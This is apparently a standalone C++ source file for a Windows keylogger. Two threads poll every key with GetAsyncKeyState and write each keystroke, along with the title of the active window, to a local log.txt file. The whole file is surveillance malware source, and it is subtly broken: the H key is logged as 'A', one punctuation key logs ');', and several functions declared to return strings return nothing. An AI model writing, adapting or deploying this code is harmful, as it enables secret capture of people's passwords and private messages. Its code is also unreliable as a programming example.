#define _WIN32_WINNT 0x0501

#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include "include/mingw.thread.h"

using namespace std;

char lastwindow[256];
std::ofstream file;

std::string Logging(std::string text){
	file << text;
	file.flush();
}

std::string GetActiveWindowTitle(){
	while(true){
		Sleep(100);
		HWND foreground = GetForegroundWindow();
		if (foreground){
			char window_title[256];
			GetWindowText(foreground, window_title, 256);
			if(strcmp(window_title, lastwindow)!=0) {
				strcpy(lastwindow, window_title);
				char wnd_title[256];
				HWND hwnd=GetForegroundWindow(); // get handle of currently active window
				GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
				std::cout<<"\n[ "<<wnd_title<<" ] ";
				Logging("\n[" + std::string(wnd_title) + "]	");
			}
		}
	}
}

std::string KeyLogger(){
	for(;;){
		Sleep(10);
        for(int key = 0; key<=256; key++){
            if(GetAsyncKeyState(key) == -32767){
                switch(key){
					case 0x41:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("A");}
						else{
							Logging("a");}
                    	break;
					case 0x42:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("B");}
						else{
							Logging("b");}
                    	break;
					case 0x43:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("C");}
						else{
							Logging("c");}
                    	break;
					case 0x44:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("D");}
						else{
							Logging("d");}
                    	break;
					case 0x45:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("E");}
						else{
							Logging("e");}
                    	break;
					case 0x46:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("F");}
						else{
							Logging("f");}
                    	break;
					case 0x47:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("G");}
						else{
							Logging("g");}
                    	break;
					case 0x48:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("A");}
						else{
							Logging("a");}
                    	break;
					case 0x49:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("I");}
						else{
							Logging("i");}
                    	break;
					case 0x4A:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("J");}
						else{
							Logging("j");}
                    	break;
					case 0x4B:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("K");}
						else{
							Logging("k");}
                    	break;
					case 0x4C:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("L");}
						else{
							Logging("l");}
                    	break;
					case 0x4D:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("M");}
						else{
							Logging("m");}
                    	break;
					case 0x4E:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("N");}
						else{
							Logging("n");}
                    	break;
					case 0x4F:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("O");}
						else{
							Logging("o");}
                    	break;
					case 0x50:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("P");}
						else{
							Logging("p");}
                    	break;
					case 0x51:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("Q");}
						else{
							Logging("q");}
                    	break;
					case 0x52:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("R");}
						else{
							Logging("r");}
                    	break;
					case 0x53:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("S");}
						else{
							Logging("s");}
                    	break;
					case 0x54:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("T");}
						else{
							Logging("t");}
                    	break;
					case 0x55:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("U");}
						else{
							Logging("u");}
                    	break;
					case 0x56:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("V");}
						else{
							Logging("v");}
                    	break;
					case 0x57:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("W");}
						else{
							Logging("w");}
                    	break;
					case 0x58:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("X");}
						else{
							Logging("x");}
                    	break;
					case 0x59:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("Y");}
						else{
							Logging("y");}
                    	break;
					case 0x5A:
						if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0 || GetAsyncKeyState(VK_SHIFT)){
							Logging("Z");}
						else{
							Logging("z");}
                    	break;
					case VK_BACK:
						Logging("[Back]");
						break;
					case VK_TAB:
						Logging("[Tab]");
						break;
					case VK_RETURN:
						Logging("[Enter]\r\n");
						break;
					case 0x12:
						Logging("[Alt]");
						break;
					case VK_ESCAPE:
						Logging("[Esc]");
						break;
					case VK_SPACE:
						Logging(" ");
						break;
					case VK_PRIOR:
						Logging("[PageUp]");
						break;
					case VK_NEXT:
						Logging("[PageDown]");
						break;
					case VK_END:
						Logging("[End]");
						break;
					case VK_HOME:
						Logging("[Home]");
						break;
					case VK_LEFT:
						Logging("[Left]");
						break;
					case VK_UP:
						Logging("[Up]");
						break;
					case VK_RIGHT:
						Logging("[Right]");
						break;
					case VK_DOWN:
						Logging("[Down]");
						break;
					case VK_SELECT:
						Logging("[Select]");
						break;
					case VK_PRINT:
						Logging("[Print]");
						break;
					case VK_EXECUTE:
						Logging("[Execute]");
						break;
					case VK_SNAPSHOT:
						Logging("[PrintScreen]");
						break;
					case VK_INSERT:
						Logging("[Insert]");
						break;
					case VK_DELETE:
						Logging("[Delete]");
						break;
					case VK_HELP:
						Logging("[Help]");
						break;
					case VK_LWIN:
						Logging("[LeftWindows]");
						break;
					case VK_RWIN:
						Logging("[RightWindows]");
						break;
					case VK_APPS:
						Logging("[Applications]");
						break;
					case VK_SLEEP:
						Logging("[Sleep]");
						break;
					case VK_NUMPAD0:
						Logging("[Pad 0]");
						break;
					case VK_NUMPAD1:
						Logging("[Pad 1]");
						break;
					case VK_NUMPAD2:
						Logging("[Pad 2]");
						break;
					case VK_NUMPAD3:
						Logging("[Pad 3]");
						break;
					case VK_NUMPAD4:
						Logging("[Pad 4]");
						break;
					case VK_NUMPAD5:
						Logging("[Pad 5]");
						break;
					case VK_NUMPAD6:
						Logging("[Pad 6]");
						break;
					case VK_NUMPAD7:
						Logging("[Pad 7]");
						break;
					case VK_NUMPAD8:
						Logging("[Pad 8]");
						break;
					case VK_NUMPAD9:
						Logging("[Pad 9]");
						break;
					case VK_MULTIPLY:
						Logging("*");
						break;
					case VK_ADD:
						Logging("+");
						break;
					case VK_SEPARATOR:
						Logging("[Separator]");
						break;
					case VK_SUBTRACT:
						Logging("-");
						break;
					case VK_DECIMAL:
						Logging(".");
						break;
					case VK_DIVIDE:
						Logging("[Devide]");
						break;
					case VK_F1:
						Logging("[F1]");
						break;
					case VK_F2:
						Logging("[F2]");
						break;
					case VK_F3:
						Logging("[F3]");
						break;
					case VK_F4:
						Logging("[F4]");
						break;
					case VK_F5:
						Logging("[F5]");
						break;
					case VK_F6:
						Logging("[F6]");
						break;
					case VK_F7:
						Logging("[F7]");
						break;
					case VK_F8:
						Logging("[F8]");
						break;
					case VK_F9:
						Logging("[F9]");
						break;
					case VK_F10:
						Logging("[F10]");
						break;
					case VK_F11:
						Logging("[F11]");
						break;
					case VK_F12:
						Logging("[F12]");
						break;
					case VK_NUMLOCK:
						Logging("[NumLock]");
						break;
					case VK_SCROLL:
						Logging("[ScrollLock]");
						break;
					case VK_LCONTROL:
						Logging("[LeftCtrl]");
						break;
					case VK_RCONTROL:
						Logging("[RightCtrl]");
						break;
					case VK_OEM_1:
						Logging(");");
						break;
					case VK_OEM_2:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("?");}
						else{
							Logging("/");}
                    	break;
					case VK_OEM_3:
						Logging("`");
						break;
					case VK_OEM_4:
						Logging("[");
						break;
					case VK_OEM_5:
						Logging("\\");
						break;
					case VK_OEM_6:
						Logging("]");
						break;
					case VK_OEM_7:
						Logging("'");
						break;
					case VK_OEM_PERIOD:
						Logging(".");
						break;
					case 0x30:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging(")");}
						else{
							Logging("0");}
                    	break;
					case 0x31:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("!");}
						else{
							Logging("1");}
                    	break;
					case 0x32:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("@");}
						else{
							Logging("2");}
                    	break;
					case 0x33:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("#");}
						else{
							Logging("3");}
                    	break;
					case 0x34:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("$");}
						else{
							Logging("4");}
                    	break;
					case 0x35:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging(std::string("%"));}
						else{
							Logging("5");}
                    	break;
					case 0x36:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("^");}
						else{
							Logging("6");}
                    	break;
					case 0x37:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("&");}
						else{
							Logging("7");}
                    	break;
					case 0x38:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("*");}
						else{
							Logging("8");}
                    	break;
					case 0x39:
						if (GetAsyncKeyState(VK_SHIFT)){
							Logging("(");}
						else{
							Logging("9");}
                    	break;
					}
            }
        }
    }
}

void atExit(){
	file.close();
}

int main(){
	file.open("log.txt");
	std::atexit(atExit);
	std::thread window(GetActiveWindowTitle), keylogger(KeyLogger);
	window.join();
	keylogger.join();
}	